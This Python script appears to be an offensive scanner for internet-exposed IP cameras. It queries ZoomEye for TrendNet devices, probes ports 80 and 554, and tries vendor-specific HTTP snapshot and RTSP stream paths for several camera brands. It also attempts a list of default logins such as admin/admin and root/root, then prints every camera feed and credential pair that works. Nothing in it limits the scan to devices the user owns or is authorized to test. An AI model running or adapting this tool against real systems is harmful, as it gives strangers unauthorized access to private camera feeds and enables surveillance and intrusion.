import subprocess
import asyncio
import aiohttp
import socket
import re
from aiortsp.rtsp.reader import RTSPReader

search_query = "app:trendnet +after:'2024-01-01' +before:'2025-01-01'"

camera_urls = {
    "dahua": ["/cgi-bin/mjpg/video.cgi", "/cgi-bin/snapshot.cgi"],
    "hikvision": ["/ISAPI/Streaming/channels/1/picture", "/onvif-http/snapshot?Profile_1"],
    "axis": ["/axis-cgi/mjpg/video.cgi", "/jpg/image.jpg", "/axis-cgi/mjpg/video.cgi?resolution=640x480"],
    "foscam": ["/videostream.cgi", "/snapshot.cgi"],
    "samsung": ["/cgi-bin/video.jpg"],
    "trendnet": ["/cgi/mjpg/mjpg.cgi", "/image/jpeg.cgi"],
    "sony": ["/image"],
}

rtsp_paths = {
    "sony": ["rtsp://{ip}/media/video1"],
    "samsung": ["rtsp://{ip}:554/profile1/media.smp", "rtsp://{ip}:554/profile2/media.smp"],
    "hikvision": ["rtsp://{ip}:554/Streaming/Channels/101", "rtsp://{ip}:554/Streaming/Channels/102"],
    "dahua": ["rtsp://{ip}:554/cam/realmonitor?channel=1&subtype=0", "rtsp://{ip}:554/cam/realmonitor?channel=1&subtype=1"],
    "axis": ["rtsp://{ip}/axis-media/media.amp", "rtsp://{ip}/axis-media/media.amp?videocodec=h264", "rtsp://{ip}/axis-media/media.amp?streamprofile=Profile_1"],
    "foscam": ["rtsp://{ip}:554/videoMain", "rtsp://{ip}:554/videoSub"],
    "trendnet": ["rtsp://{ip}/h264_vga.sdp", "rtsp://{ip}/h264_hd.sdp"],
}

credentials = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("root", "root"),
    ("user", "user"),
    ("administrator", "admin"),
]

async def is_port_open(ip, port, timeout=1):
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
        writer.close()
        await writer.wait_closed()
        return True
    except (asyncio.TimeoutError, ConnectionRefusedError):
        return False

async def check_url(session, ip, url, creds):
    full_url = f"http://{ip}{url}"
    auth = aiohttp.BasicAuth(*creds) if creds else None

    try:
        async with session.get(full_url, auth=auth) as response:
            if response.status == 200:
                return full_url, creds
            return None
    except Exception as e:
        print(f"[-] Error in URL {full_url}: {e}")
        return None

async def check_rtsp_streams(ip, app):
    if app in rtsp_paths:
        for rtsp_template in rtsp_paths[app]:
            rtsp_url = rtsp_template.format(ip=ip)
            print(f"[DEBUG] Checking RTSP-stream: {rtsp_url}")
            if await check_rtsp_connection(rtsp_url):
                return rtsp_url
    return None

async def check_rtsp_connection(rtsp_url):
    try:
        async with RTSPReader(rtsp_url) as reader:
            print("[DEBUG] Successful connection to RTSP stream.")
            return True
    except Exception as e:
        print(f"[-] Failed to connect to RTSP stream: {e}")
        print(f"[DEBUG] Exception: {str(e)}")
        return False

async def check_camera(ip, app):
    http_available = await is_port_open(ip, 80)
    rtsp_available = await is_port_open(ip, 554)

    if not http_available and not rtsp_available:
        print(f"[-] IP {ip} not available on ports 80 and 554. Skipping...")
        return []

    async with aiohttp.ClientSession() as session:
        tasks = []
        debug_urls = set()
        successful_connections = []

        if http_available:
            urls = camera_urls.get(app.lower(), [])
            for url in urls:
                tasks.append(check_url(session, ip, url, None))
                debug_urls.add(url)
                for cred in credentials:
                    tasks.append(check_url(session, ip, url, cred))

        if rtsp_available:
            rtsp_url = await check_rtsp_streams(ip, app)
            if rtsp_url:
                print(f"[DEBUG] Successful connection to RTSP stream: {rtsp_url}")
                successful_connections.append((rtsp_url, None))

        results = await asyncio.gather(*tasks)
        for url in debug_urls:
            print(f"[DEBUG] Checking URL: {url}")

        for result in results:
            if result:
                successful_connections.append(result)

        return successful_connections

async def main():
    result = subprocess.run(
        ["zoomeye", "search", f"{search_query}"],
        capture_output=True, text=True
    )

    print("[DEBUG] Search result:")
    print(result.stdout.strip())

    total_found = 0
    successful_connections = []

    pattern = r'(?P<ip>[\d\.]+):(?P<port>\d+)\s+(?P<service>\S+)\s+(?P<country>.+?)\s+(?P<app>.+?)\s+'

    for line in result.stdout.splitlines():
        if line.strip() and ':' in line and not line.startswith('ip:port'):
            match = re.match(pattern, line.strip())
            if match:
                ip = match.group('ip')
                app = match.group('app').strip().lower()

                print(f"[DEBUG] App found: {app} on IP: {ip}")

                if not valid_ip(ip):
                    print(f"[-] Wrong IP: {ip}. Skipping...")
                    continue
                
                total_found += 1

                if app not in camera_urls:
                    print(f"[-] Unknown app: {app}. Skipping...")
                    continue

                print(f"\n[+] Camera found '{app}' on IP: {ip}")
                connections = await check_camera(ip, app)

                successful_connections.extend(connections)
                await asyncio.sleep(1)  # sec

    print("\n--- Results ---")
    if successful_connections:
        print(f"[+] Successful connections found: {len(successful_connections)}\n")
        for url, creds in successful_connections:
            creds_info = f" (login: {creds[0]}, password: {creds[1]})" if creds else ""
            print(f"[URL]: {url}{creds_info}")
    else:
        print("[-] No successful connections found.")
    print(f"total: {total_found}/{len(result.stdout.splitlines()) - 1}")

def valid_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False

if __name__ == "__main__":
    asyncio.run(main())
